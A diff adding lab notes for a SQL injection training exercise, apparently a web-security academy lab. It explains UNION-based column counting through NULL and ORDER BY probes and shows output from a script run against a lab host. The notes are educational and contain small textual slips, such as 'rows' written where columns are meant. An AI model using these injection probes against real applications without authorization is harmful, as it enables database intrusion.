@@ -1,0 +1,70 @@
+LAB 03 - SQL injection UNION attack, determining the number of columns returned by the query
+
+SQLi - Product category filter
+
+End Goal: Determine the number of columns returned by the query.
+
+Background on how the UNION operator works:
+
+table1      table2
+a | b       c | d
+------      -----
+1 , 2       2 , 3
+3 , 4       4 , 5
+
+Query #1: SELECT a,b FROM table11,2
+1,2
+3,4
+
+Query #2: SELECT a,b FROM table 1 UNION SELECT c,d FROM table2
+1,2
+3,4
+2,3
+4,5
+
+Rule with UNION (https://learn.microsoft.com/en-us/sql/t-sql/language-elements/set-operators-union-transact-sql?view=sql-server-ver16)
+- The number and the order of the columns must be the same in all queries
+- The data types must be compatible
+
+SQLi attack:
+
+METHOD 1: Utilize UNION operator
+
+SELECT ? FROM table1 UNION SELECT NULL
+- error -> incorrect number of columns
+
+SELECT ? FROM table1 UNION SELECT NULL, NULL
+- error -> incorrect number of columns
+
+SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL...
+- error -> incorrect number of columns
+
+SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL, NULL
+- 200 response code -> correct number of columns
+
+Iteratively running these commands above will reveal to us how many rows table1 has.
+
+METHOD 2: Utilize the ORDER BY operator
+
+SELECT a,b FROM table1 ORDER BY <NUM> // order by column <NUM>
+
+SELECT a,b FROM table1 ORDER BY 1
+SELECT a,b FROM table1 ORDER BY 2...
+SELECT a,b FROM table1 ORDER BY N
+
+Once a query outputs "error -> incorrect number of columns", we will know that the number of columns is N - 1
+
+====================================================================================================================
+script.py <url>
+
+Output:
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-03]
+└─$ python3 sqli-lab-03.py
+[-] Usage: sqli-lab-03.py <url>
+[-] Example: sqli-lab-03.py "www.example.com"
+                                                                                                                                                                                                   
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-03]
+└─$ python3 sqli-lab-03.py "https://0a09004003fbe29f8312a5020016004a.web-security-academy.net"
+[+] Figuring out number of columns...
+[+] The number of columns is 3.
